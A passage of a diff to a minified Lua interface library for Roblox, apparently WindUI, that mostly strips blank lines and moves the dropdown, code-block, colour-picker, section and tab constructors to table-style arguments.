     })
-
     q.UIElements.MenuCanvas=i("CanvasGroup",{
       Size=UDim2.new(0,170,0,300),
       BackgroundTransparency=1,
@@ -3135,17 +3157,10 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       AnchorPoint=Vector2.new(1,0),
     },{
       q.UIElements.Menu,
-
-
-
-
-
-
       i("UISizeConstraint",{
         MinSize=Vector2.new(170,0)
       })
     })
-
     function q.Lock(s)
       r=false
       return q.DropdownFrame:Lock()
@@ -3154,15 +3169,12 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       r=true
       return q.DropdownFrame:Unlock()
     end
-
     if q.Locked then
       q:Lock()
     end
-
     local function RecalculateCanvasSize()
       q.UIElements.Menu.CanvasGroup.ScrollingFrame.CanvasSize=UDim2.fromOffset(0,q.UIElements.UIListLayout.AbsoluteContentSize.Y)
     end
-
     local function RecalculateListSize()
       if#q.Values>10 then
         q.UIElements.MenuCanvas.Size=UDim2.fromOffset(q.UIElements.MenuCanvas.AbsoluteSize.X,392)
@@ -3170,19 +3182,16 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         q.UIElements.MenuCanvas.Size=UDim2.fromOffset(q.UIElements.MenuCanvas.AbsoluteSize.X,q.UIElements.UIListLayout.AbsoluteContentSize.Y+n.MenuPadding)
       end
     end
-
     function UpdatePosition()
       local s=q.UIElements.Dropdown
       local t=q.UIElements.MenuCanvas
 
       local u=g.ViewportSize.Y-(s.AbsolutePosition.Y+s.AbsoluteSize.Y)-n.MenuPadding-54
       local v=t.AbsoluteSize.Y+n.MenuPadding
-
       local w=-54
       if u<v then
         w=v-u-54
       end
-
       t.Position=UDim2.new(
       0,
       s.AbsolutePosition.X+s.AbsoluteSize.X,
@@ -3190,13 +3199,9 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       s.AbsolutePosition.Y+s.AbsoluteSize.Y-w+n.MenuPadding
       )
     end
-
-
-
     function q.Display(s)
       local t=q.Values
       local u=""
-
       if q.Multi then
         for v,w in next,t do
           if table.find(q.Value,w)then
@@ -3207,21 +3212,16 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
        else
         u=q.Value or""
       end
-
       q.UIElements.Dropdown.Frame.Frame.TextLabel.Text=(u==""and"--"or u)
     end
-
     function q.Refresh(s,t)
       for u,v in next,q.UIElements.Menu.CanvasGroup.ScrollingFrame:GetChildren()do
         if not v:IsA"UIListLayout"then
           v:Destroy()
         end
       end
-
       q.Tabs={}
-
       for w,x in next,t do
-
         local y={
           Name=x,
           Selected=false,
@@ -3275,32 +3275,25 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
             Position=UDim2.new(0,0,0.5,0),
           })
         })
-
-
         if q.Multi then
           y.Selected=table.find(q.Value or{},y.Name)
          else
           y.Selected=q.Value==y.Name
         end
-
         if y.Selected then
           y.UIElements.TabItem.BackgroundTransparency=.93
           y.UIElements.TabItem.ImageLabel.ImageTransparency=.1
           y.UIElements.TabItem.TextLabel.Position=UDim2.new(0,18+n.TabPadding+2,0.5,0)
           y.UIElements.TabItem.TextLabel.TextTransparency=0
         end
-
         q.Tabs[w]=y
-
         q:Display()
-
         local function Callback()
           q:Display()
           task.spawn(function()
             h.SafeCallback(q.Callback,q.Value)
           end)
         end
-
         h.AddSignal(y.UIElements.TabItem.MouseButton1Click,function()
           if q.Multi then
             if not y.Selected then
@@ -3326,7 +3319,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
             end
            else
             for z,A in next,q.Tabs do
-
               j(A.UIElements.TabItem,0.1,{BackgroundTransparency=1}):Play()
               j(A.UIElements.TabItem.ImageLabel,0.1,{ImageTransparency=1}):Play()
               j(A.UIElements.TabItem.TextLabel,0.1,{Position=UDim2.new(0,0,0.5,0),TextTransparency=.4}):Play()
@@ -3340,27 +3332,19 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           end
           Callback()
         end)
-
         RecalculateCanvasSize()
         RecalculateListSize()
       end
-
       local y=0
       for z,A in next,q.Tabs do
         if A.UIElements.TabItem.TextLabel then
-
           local B=A.UIElements.TabItem.TextLabel.TextBounds.X
           y=math.max(y,B)
         end
       end
-
       q.UIElements.MenuCanvas.Size=UDim2.new(0,y+6+6+5+5+18+6+6,q.UIElements.MenuCanvas.Size.Y.Scale,q.UIElements.MenuCanvas.Size.Y.Offset)
-
     end
-
-
     q:Refresh(q.Values)
-
     function q.Select(s,t)
       if t then
         q.Value=t
@@ -3369,15 +3353,11 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           q.Value={}
          else
           q.Value=nil
-
         end
       end
       q:Refresh(q.Values)
     end
-
-
     RecalculateListSize()
-
     function q.Open(s)
       if r then
         q.UIElements.MenuCanvas.Visible=true
@@ -3392,21 +3372,16 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           1,0
           )
         },Enum.EasingStyle.Quart,Enum.EasingDirection.Out):Play()
-
         task.spawn(function()
           task.wait(.1)
           q.Opened=true
         end)
-
-
         j(q.UIElements.MenuCanvas,.15,{GroupTransparency=0}):Play()
-
         UpdatePosition()
       end
     end
     function q.Close(s)
       q.Opened=false
-
       j(q.UIElements.Menu,0.1,{
         Size=UDim2.new(
         1,0,
@@ -3419,11 +3394,9 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       q.UIElements.MenuCanvas.Visible=false
       q.UIElements.MenuCanvas.Active=false
     end
-
     h.AddSignal(q.UIElements.Dropdown.MouseButton1Click,function()
       q:Open()
     end)
-
     h.AddSignal(b.InputBegan,function(s)
       if
         s.UserInputType==Enum.UserInputType.MouseButton1
@@ -3443,19 +3416,12 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         end
       end
     end)
-
     h.AddSignal(q.UIElements.Dropdown:GetPropertyChangedSignal"AbsolutePosition",UpdatePosition)
-
     return q.__type,q
   end
-
-  return n end function a.v()
-
-
-
-
-
-
+  return n
+end
+function a.v()
   local b={}
   local e={
     lua={
@@ -3499,14 +3465,11 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
   local h=createKeywordSet(e.lua)
   local i=createKeywordSet(e.rbx)
   local j=createKeywordSet(e.operators)
-
   local function getHighlight(k,n)
     local o=k[n]
-
     if g[o.."_color"]then
       return g[o.."_color"]
     end
-
     if tonumber(o)then
       return g.numbers
      elseif o=="nil"then
@@ -3524,48 +3487,37 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
      elseif o=="true"or o=="false"then
       return g.boolean
     end
-
     if k[n+1]=="("then
       if k[n-1]==":"then
         return g.self_call
       end
-
       return g.call
     end
-
     if k[n-1]=="."then
       if k[n-2]=="Enum"then
         return g.rbx
       end
-
       return g.local_property
     end
   end
-
   function b.run(k)
     local n={}
     local o=""
-
     local p=false
     local q=false
     local r=false
-
     for s=1,#k do
       local t=k:sub(s,s)
-
       if q then
         if t=="\n"and not r then
           table.insert(n,o)
           table.insert(n,t)
           o=""
-
           q=false
          elseif k:sub(s-1,s)=="]]"and r then
           o..="]"
-
           table.insert(n,o)
           o=""
-
           q=false
           r=false
          else
@@ -3601,41 +3553,32 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         end
       end
     end
-
     table.insert(n,o)
-
     local s={}
-
     for t,v in ipairs(n)do
       local w=getHighlight(n,t)
-
       if w then
         local x=string.format("<font color = \"#%s\">%s</font>",w:ToHex(),v:gsub("<","&lt;"):gsub(">","&gt;"))
-
         table.insert(s,x)
        else
         table.insert(s,v)
       end
     end
-
     return table.concat(s)
   end
-
-  return b end function a.w()
+  return b
+end
+function a.w()
   local b={}
-
   local e=a.load'a'
   local g=e.New
   local h=e.Tween
-
   local i=a.load'v'
-
   function b.New(j,k,n,o,p)
     local q={
       Radius=12,
       Padding=10
     }
-
     local r=g("TextLabel",{
       Text="",
       TextColor3=Color3.fromHex"#CDD6F4",
@@ -3657,7 +3600,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       })
     })
     r.Font="Code"
-
     local s=g("ScrollingFrame",{
       Size=UDim2.new(1,0,0,0),
       BackgroundTransparency=1,
@@ -3669,7 +3611,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     },{
       r
     })
-
     local t=g("TextButton",{
       BackgroundTransparency=1,
       Size=UDim2.new(0,30,0,30),
@@ -3678,9 +3619,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       Visible=o and true or false,
     },{
       e.NewRoundFrame(q.Radius-4,"Squircle",{
-
-
-
         ImageColor3=Color3.fromHex"#ffffff",
         ImageTransparency=1,
         Size=UDim2.new(1,0,1,0),
@@ -3699,15 +3637,11 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           AnchorPoint=Vector2.new(0.5,0.5),
           Position=UDim2.new(0.5,0,0.5,0),
           Size=UDim2.new(0,12,0,12),
-
-
-
           ImageColor3=Color3.fromHex"#ffffff",
           ImageTransparency=.1,
         })
       })
     })
-
     e.AddSignal(t.MouseEnter,function()
       h(t.Button,.05,{ImageTransparency=.95}):Play()
       h(t.Button.UIScale,.05,{Scale=.9}):Play()
@@ -3716,11 +3650,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       h(t.Button,.08,{ImageTransparency=1}):Play()
       h(t.Button.UIScale,.08,{Scale=1}):Play()
     end)
-
     e.NewRoundFrame(q.Radius,"Squircle",{
-
-
-
       ImageColor3=Color3.fromHex"#212121",
       ImageTransparency=.035,
       Size=UDim2.new(1,0,0,20+(q.Padding*2)),
@@ -3729,9 +3659,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     },{
       e.NewRoundFrame(q.Radius,"SquircleOutline",{
         Size=UDim2.new(1,0,1,0),
-
-
-
         ImageColor3=Color3.fromHex"#ffffff",
         ImageTransparency=.955,
       }),
@@ -3741,9 +3668,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         AutomaticSize="Y",
       },{
         e.NewRoundFrame(q.Radius,"Squircle-TL-TR",{
-
-
-
           ImageColor3=Color3.fromHex"#ffffff",
           ImageTransparency=.96,
           Size=UDim2.new(1,0,0,20+(q.Padding*2)),
@@ -3753,17 +3677,11 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
             Size=UDim2.new(0,18,0,18),
             BackgroundTransparency=1,
             Image="rbxassetid://132464694294269",
-
-
-
             ImageColor3=Color3.fromHex"#ffffff",
             ImageTransparency=.2,
           }),
           g("TextLabel",{
             Text=k,
-
-
-
             TextColor3=Color3.fromHex"#ffffff",
             TextTransparency=.2,
             TextSize=16,
@@ -3794,17 +3712,13 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       }),
       t,
     })
-
     e.AddSignal(r:GetPropertyChangedSignal"TextBounds",function()
       s.Size=UDim2.new(1,0,0,(r.TextBounds.Y/(p or 1))+((q.Padding+3)*2))
     end)
-
     function q.Set(v)
       r.Text=i.run(v)
     end
-
     q.Set(j)
-
     e.AddSignal(t.MouseButton1Click,function()
       if o then
         o()
@@ -3816,24 +3730,19 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     end)
     return q
   end
-
-
   return b end function a.x()
   local b=a.load'a'local e=
   b.New
-
-
   local g=a.load'w'
-
   local h={}
-
-  function h.New(i, Title, Code)
+  function h.New(i,j)
     local k={
       __type="Code",
-      Title=Title,
-      Code=Code,
+      Title=j.Title,
+      Code=j.Code,
       UIElements={}
     }
+
     local n=not k.Locked
     local o=g.New(k.Code,k.Title,j.Parent,function()
       if n then
@@ -3842,9 +3751,19 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           toclipboard(k.Code)
         end)
         if p then
-          j.WindUI:Notify("Success", "The "..o.." copied to your clipboard.", 5, "check")
+          j.WindUI:Notify{
+            Title="Success",
+            Content="The "..o.." copied to your clipboard.",
+            Icon="check",
+            Duration=5,
+          }
          else
-          j.WindUI:Notify("Error", "The "..o.." is not copied. Error: "..q, 5, "x")
+          j.WindUI:Notify{
+            Title="Error",
+            Content="The "..o.." is not copied. Error: "..q,
+            Icon="x",
+            Duration=5,
+          }
         end
       end
     end,j.WindUI.UIScale)
@@ -3877,36 +3796,27 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     UICorner=8,
     UIPadding=8
   }
-
-  function r.Colorpicker(s, Title, Default, Callback, Transparency, UIElements)
+  function r.Colorpicker(s,t,v)
     local w={
       __type="Colorpicker",
-      Title=Title,
-      Desc=nil,
-      Default=Default,
-      Callback=Callback,
-      Transparency=Transparency or 0,
-      UIElements=UIElements or {},
+      Title=t.Title,
+      Desc=t.Desc,
+      Default=t.Default,
+      Callback=t.Callback,
+      Transparency=t.Transparency,
+      UIElements=t.UIElements,
     }
-
     function w.SetHSVFromRGB(x,y)
       local z,A,B=Color3.toHSV(y)
       w.Hue=z
       w.Sat=A
       w.Vib=B
     end
-
     w:SetHSVFromRGB(w.Default)
-
     local x=a.load'e'.Init(t.Window)
     local y=x.Create()
-
     w.ColorpickerFrame=y
-
-
-
     local z,A,B=w.Hue,w.Sat,w.Vib
-
     w.UIElements.Title=e("TextLabel",{
       Text=w.Title,
       TextSize=20,
@@ -3927,11 +3837,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         PaddingBottom=UDim.new(0,8),
       })
     })
-
-
-
-
-
     local C=e("ImageLabel",{
       Size=UDim2.new(0,18,0,18),
       ScaleType=Enum.ScaleType.Fit,
@@ -3939,7 +3844,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       BackgroundTransparency=1,
       Image="http://www.roblox.com/asset/?id=4805639000",
     })
-
     w.UIElements.SatVibMap=e("ImageLabel",{
       Size=UDim2.fromOffset(160,158),
       Position=UDim2.fromOffset(0,40),
@@ -3960,7 +3864,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       }),
       C,
     })
-
     w.UIElements.Inputs=e("Frame",{
       AutomaticSize="XY",
       Size=UDim2.new(0,0,0,0),
@@ -3973,11 +3876,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         FillDirection="Vertical",
       })
     })
-
-
-
-
-
     local D=e("Frame",{
       BackgroundColor3=w.Default,
       Size=UDim2.fromScale(1,1),
@@ -3987,7 +3885,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         CornerRadius=UDim.new(0,8),
       }),
     })
-
     e("ImageLabel",{
       Image="http://www.roblox.com/asset/?id=14204231522",
       ImageTransparency=0.45,
@@ -4010,7 +3907,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       }),
       D,
     })
-
     local E=e("Frame",{
       BackgroundColor3=w.Default,
       Size=UDim2.fromScale(1,1),
@@ -4021,7 +3917,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         CornerRadius=UDim.new(0,8),
       }),
     })
-
     e("ImageLabel",{
       Image="http://www.roblox.com/asset/?id=14204231522",
       ImageTransparency=0.45,
@@ -4044,31 +3939,24 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       }),
       E,
     })
-
     local F={}
-
     for G=0,1,0.1 do
       table.insert(F,ColorSequenceKeypoint.new(G,Color3.fromHSV(G,1,1)))
     end
-
     local G=e("UIGradient",{
       Color=ColorSequence.new(F),
       Rotation=90,
     })
-
     local H=e("Frame",{
       Size=UDim2.new(1,0,1,0),
       Position=UDim2.new(0,0,0,0),
       BackgroundTransparency=1,
     })
-
     local I=e("Frame",{
       Size=UDim2.new(0,14,0,14),
       AnchorPoint=Vector2.new(0.5,0.5),
       Position=UDim2.new(0.5,0,0,0),
       Parent=H,
-
-
       BackgroundColor3=w.Default
     },{
       e("UIStroke",{
@@ -4082,7 +3970,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         CornerRadius=UDim.new(1,0),
       })
     })
-
     local J=e("Frame",{
       Size=UDim2.fromOffset(10,192),
       Position=UDim2.fromOffset(180,40),
@@ -4094,11 +3981,8 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       G,
       H,
     })
-
-
     function CreateNewInput(K,L)
       local M=q(K,nil,w.UIElements.Inputs)
-
       e("TextLabel",{
         BackgroundTransparency=1,
         TextTransparency=.4,
@@ -4113,18 +3997,14 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         Parent=M.Frame,
         Text=K,
       })
-
       e("UIScale",{
         Parent=M,
         Scale=.85,
       })
-
       M.Frame.Frame.TextBox.Text=L
       M.Size=UDim2.new(0,150,0,42)
-
       return M
     end
-
     local function ToRGB(K)
       return{
         R=math.floor(K.R*255),
@@ -4132,9 +4012,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         B=math.floor(K.B*255)
       }
     end
-
     local K=CreateNewInput("Hex","#"..w.Default:ToHex())
-
     local L=CreateNewInput("Red",ToRGB(w.Default).R)
     local M=CreateNewInput("Green",ToRGB(w.Default).G)
     local N=CreateNewInput("Blue",ToRGB(w.Default).B)
@@ -4142,7 +4020,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     if w.Transparency then
       O=CreateNewInput("Alpha",((1-w.Transparency)*100).."%")
     end
-
     local P=e("Frame",{
       Size=UDim2.new(1,0,0,40),
       AutomaticSize="Y",
@@ -4157,7 +4034,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         HorizontalAlignment="Right",
       }),
     })
-
     local Q={
       {
         Title="Cancel",
@@ -4171,15 +4047,11 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         Callback=function()v(Color3.fromHSV(w.Hue,w.Sat,w.Vib),w.Transparency)end
       }
     }
-
     for R,S in next,Q do
       local T=p(S.Title,S.Icon,S.Callback,S.Variant,P,y,true)
       T.Size=UDim2.new(0.5,-3,0,40)
       T.AutomaticSize="None"
     end
-
-
-
     local T,U,V
     if w.Transparency then
       local W=e("Frame",{
@@ -4187,7 +4059,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         Position=UDim2.fromOffset(0,0),
         BackgroundTransparency=1,
       })
-
       U=e("ImageLabel",{
         Size=UDim2.new(0,14,0,14),
         AnchorPoint=Vector2.new(0.5,0.5),
@@ -4196,7 +4067,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           BackgroundColor3="Text",
         },
         Parent=W,
-
       },{
         e("UIStroke",{
           Thickness=2,
@@ -4208,9 +4078,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         e("UICorner",{
           CornerRadius=UDim.new(1,0),
         })
-
       })
-
       V=e("Frame",{
         Size=UDim2.fromScale(1,1),
       },{
@@ -4225,7 +4093,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           CornerRadius=UDim.new(0,6),
         }),
       })
-
       T=e("Frame",{
         Size=UDim2.fromOffset(10,192),
         Position=UDim2.fromOffset(210,40),
@@ -4251,7 +4118,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         W,
       })
     end
-
     function w.Round(W,X,Y)
       if Y==0 then
         return math.floor(X)
@@ -4259,8 +4125,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       X=tostring(X)
       return X:find"%."and tonumber(X:sub(1,X:find"%."+Y))or X
     end
-
-
     function w.Update(W,X,Y)
       if X then z,A,B=Color3.toHSV(X)else z,A,B=w.Hue,w.Sat,w.Vib end
 
@@ -4284,23 +4148,14 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         O.Frame.Frame.TextBox.Text=w:Round((1-w.Transparency or Y)*100,0).."%"
       end
     end
-
     w:Update(w.Default,w.Transparency)
-
-
-
-
     local function GetRGB()
       local W=Color3.fromHSV(w.Hue,w.Sat,w.Vib)
       return{R=math.floor(W.r*255),G=math.floor(W.g*255),B=math.floor(W.b*255)}
     end
-
-
-
     local function clamp(W,X,Y)
       return math.clamp(tonumber(W)or 0,X,Y)
     end
-
     b.AddSignal(K.Frame.Frame.TextBox.FocusLost,function(W)
       if W then
         local X=K.Frame.Frame.TextBox.Text:gsub("#","")
@@ -4312,7 +4167,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         end
       end
     end)
-
     local function updateColorFromInput(W,X)
       b.AddSignal(W.Frame.Frame.TextBox.FocusLost,function(Y)
         if Y then
@@ -4320,7 +4174,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           local _=GetRGB()
           local aa=clamp(Z.Text,0,255)
           Z.Text=tostring(aa)
-
           _[X]=aa
           local ab=Color3.fromRGB(_.R,_.G,_.B)
           w.Hue,w.Sat,w.Vib=Color3.toHSV(ab)
@@ -4328,26 +4181,20 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         end
       end)
     end
-
     updateColorFromInput(L,"R")
     updateColorFromInput(M,"G")
     updateColorFromInput(N,"B")
-
     if w.Transparency then
       b.AddSignal(O.Frame.Frame.TextBox.FocusLost,function(aa)
         if aa then
           local ab=O.Frame.Frame.TextBox
           local W=clamp(ab.Text,0,100)
           ab.Text=tostring(W)
-
           w.Transparency=1-W*0.01
           w:Update(nil,w.Transparency)
         end
       end)
     end
-
-
-
     local aa=w.UIElements.SatVibMap
     b.AddSignal(aa.InputBegan,function(ab)
       if ab.UserInputType==Enum.UserInputType.MouseButton1 or ab.UserInputType==Enum.UserInputType.Touch then
@@ -4355,35 +4202,28 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           local W=aa.AbsolutePosition.X
           local X=W+aa.AbsoluteSize.X
           local Y=math.clamp(o.X,W,X)
-
           local Z=aa.AbsolutePosition.Y
           local _=Z+aa.AbsoluteSize.Y
           local ac=math.clamp(o.Y,Z,_)
-
           w.Sat=(Y-W)/(X-W)
           w.Vib=1-((ac-Z)/(_-Z))
           w:Update()
-
           k:Wait()
         end
       end
     end)
-
     b.AddSignal(J.InputBegan,function(ab)
       if ab.UserInputType==Enum.UserInputType.MouseButton1 or ab.UserInputType==Enum.UserInputType.Touch then
         while h:IsMouseButtonPressed(Enum.UserInputType.MouseButton1)do
           local ac=J.AbsolutePosition.Y
           local W=ac+J.AbsoluteSize.Y
           local X=math.clamp(o.Y,ac,W)
-
           w.Hue=((X-ac)/(W-ac))
           w:Update()
-
           k:Wait()
         end
       end
     end)
-
     if w.Transparency then
       b.AddSignal(T.InputBegan,function(ab)
         if ab.UserInputType==Enum.UserInputType.MouseButton1 or ab.UserInputType==Enum.UserInputType.Touch then
@@ -4391,19 +4231,15 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
             local ac=T.AbsolutePosition.Y
             local W=ac+T.AbsoluteSize.Y
             local X=math.clamp(o.Y,ac,W)
-
             w.Transparency=1-((X-ac)/(W-ac))
             w:Update()
-
             k:Wait()
           end
         end
       end)
     end
-
     return w
   end
-
   function r.New(aa,ab)
     local ac={
       __type="Colorpicker",
@@ -4416,10 +4252,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       Transparency=ab.Transparency,
       UIElements={}
     }
-
     local s=true
-
-
     ac.ColorpickerFrame=a.load'm'{
       Title=ac.Title,
       Desc=ac.Desc,
@@ -4427,7 +4260,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       TextOffset=40,
       Hover=false,
     }
-
     ac.UIElements.Colorpicker=b.NewRoundFrame(r.UICorner,"Squircle",{
       ImageTransparency=0,
       Active=true,
@@ -4438,8 +4270,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       Position=UDim2.new(1,0,0.5,0),
       ZIndex=2
     },nil,true)
-
-
     function ac.Lock(t)
       s=false
       return ac.ColorpickerFrame:Lock()
@@ -4448,12 +4278,9 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       s=true
       return ac.ColorpickerFrame:Unlock()
     end
-
     if ac.Locked then
       ac:Lock()
     end
-
-
     function ac.Update(t,v,w)
       ac.UIElements.Colorpicker.ImageTransparency=w or 0
       ac.UIElements.Colorpicker.ImageColor3=v
@@ -4462,11 +4289,9 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         ac.Transparency=w
       end
     end
-
     function ac.Set(t,v,w)
       return ac:Update(v,w)
     end
-
     b.AddSignal(ac.UIElements.Colorpicker.MouseButton1Click,function()
       if s then
         r:Colorpicker(ac,function(t,v)
@@ -4477,27 +4302,22 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         end).ColorpickerFrame:Open()
       end
     end)
-
     return ac.__type,ac
   end
-
   return r end function a.z()
   local aa=a.load'a'
   local ab=aa.New
   local ac=aa.Tween
-
   local b={}
-
-  function b.New(e, Title, Icon)
+  function b.New(e,g)
     local h={
       __type="Section",
-      Title=Title or"Section",
-      Icon=Icon,
-      TextXAlignment="Left",
-      TextSize=19,
+      Title=g.Title or"Section",
+      Icon=g.Icon,
+      TextXAlignment=g.TextXAlignment or"Left",
+      TextSize=g.TextSize or 19,
       UIElements={},
     }
-
     local i
     if h.Icon then
       i=aa.Image(
@@ -4510,7 +4330,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       )
       i.Size=UDim2.new(0,24,0,24)
     end
-
     h.UIElements.Main=ab("TextLabel",{
       BackgroundTransparency=1,
       TextXAlignment="Left",
@@ -4520,11 +4339,8 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         TextColor3="Text",
       },
       FontFace=Font.new(aa.Font,Enum.FontWeight.SemiBold),
-
-
       Text=h.Title,
     })
-
     ab("Frame",{
       Size=UDim2.new(1,0,0,0),
       BackgroundTransparency=1,
@@ -4544,30 +4360,23 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         PaddingBottom=UDim.new(0,2),
       })
     })
-
-
-
-
-
     function h.SetTitle(j,k)
       h.UIElements.Main.Text=k
     end
     function h.Destroy(j)
       h.UIElements.Main.AutomaticSize="None"
       h.UIElements.Main.Size=UDim2.new(1,0,0,h.UIElements.Main.TextBounds.Y)
-
       ac(h.UIElements.Main,.1,{TextTransparency=1}):Play()
       task.wait(.1)
       ac(h.UIElements.Main,.15,{Size=UDim2.new(1,0,0,0)},Enum.EasingStyle.Quint,Enum.EasingDirection.InOut):Play()
     end
-
     return h.__type,h
   end
-
-  return b end function a.A()
+  return b
+end
+function a.A()
   game:GetService"UserInputService"
   local aa=game.Players.LocalPlayer:GetMouse()
-
   local ab=a.load'a'
   local ac=ab.New
   local b=ab.Tween
@@ -4575,8 +4384,6 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
   local e=a.load'c'.New
   local g=a.load'l'.New
   local h=a.load'j'.New
-
-
   local i={
     Window=nil,
     WindUI=nil,
@@ -4586,10 +4393,8 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     TabCount=0,
     ToolTipParent=nil,
     TabHighlight=nil,
-
     OnChangeFunc=function(i)end
   }
-
   function i.Init(j,k,n,o)
     i.Window=j
     i.WindUI=k
@@ -4597,32 +4402,28 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     i.TabHighlight=o
     return i
   end
-
-  function i.New(Title, Icon, IconThemed, ShowTabTitle, Parent)
+  function i.New(j)
     local k={
       __type="Tab",
-      Title=Title or"Tab",
-      Desc=nil,
-      Icon=Icon or "bird",
-      IconThemed=IconThemed or false,
-      Locked=false,
-      ShowTabTitle=ShowTabTitle or true,
+      Title=j.Title or"Tab",
+      Desc=j.Desc,
+      Icon=j.Icon,
+      IconThemed=j.IconThemed,
+      Locked=j.Locked,
+      ShowTabTitle=j.ShowTabTitle,
       Selected=false,
       Index=nil,
-      Parent=Parent or nil,
+      Parent=j.Parent,
       UIElements={},
       Elements={},
       ContainerFrame=nil,
       UICorner=i.Window.UICorner-(i.Window.UIPadding/2),
     }
-
     local n=i.Window
     local o=i.WindUI
-
     i.TabCount=i.TabCount+1
     local p=i.TabCount
     k.Index=p
-
     k.UIElements.Main=ab.NewRoundFrame(k.UICorner,"Squircle",{
       BackgroundTransparency=1,
       Size=UDim2.new(1,-7,0,0),
@@ -4672,11 +4473,9 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         })
       }),
     },true)
-
     local q=0
     local r
     local s
-
